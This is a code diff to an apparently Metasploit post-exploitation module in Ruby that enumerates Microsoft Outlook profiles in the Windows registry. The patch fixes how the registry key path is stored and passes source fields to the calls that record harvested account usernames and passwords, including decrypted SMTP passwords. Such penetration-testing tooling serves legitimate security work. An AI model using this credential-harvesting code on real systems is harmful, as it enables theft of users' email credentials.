@@ -84,8 +84,8 @@ class Metasploit3 < Msf::Post
 
 	# Just a wrapper to avoid copy pasta and long lines
 	def get_valdata(k, name)
-		key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
-		registry_getvaldata("#{key_base}\\#{k}", name)
+		@key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
+		registry_getvaldata("#{@key_base}\\#{k}", name)
 	end
 
 	def get_registry
@@ -101,7 +101,7 @@ class Metasploit3 < Msf::Post
 
 			print_status "Microsoft Outlook found in Registry..."
 			outlook_exists = 1
-			registry_enumkeys(key_base + "9375CFF0413111d3B88A00104B2A6676\\").each do |k|
+			registry_enumkeys(@key_base).each do |k|
 				display_name = get_valdata(k, 'Display Name')
 
 				if display_name == nil
@@ -308,6 +308,8 @@ class Metasploit3 < Msf::Post
 						:host  => host,
 						:port => portnum,
 						:sname => type,
+						:source_id => session.db_record.id,
+						:source_type => "exploit",
 						:user => user,
 						:pass => pass)
 					#print_status("CHK report_auth_info: host = #{host}, port= #{portnum}, sname= #{type}, user= #{user}, pass= #{pass}")
@@ -318,6 +320,8 @@ class Metasploit3 < Msf::Post
 						:host  => smtp_server,
 						:port => smtp_port,
 						:sname => "SMTP",
+						:source_id => session.db_record.id,
+						:source_type => "exploit",
 						:user => smtp_user,
 						:pass => smtp_decrypted_password)
 					#print_status("SMTP report_auth_info: host = #{smtp_server}, port= #{smtp_port}, sname= SMTP, user= #{smtp_user}, pass= #{smtp_decrypted_password}")
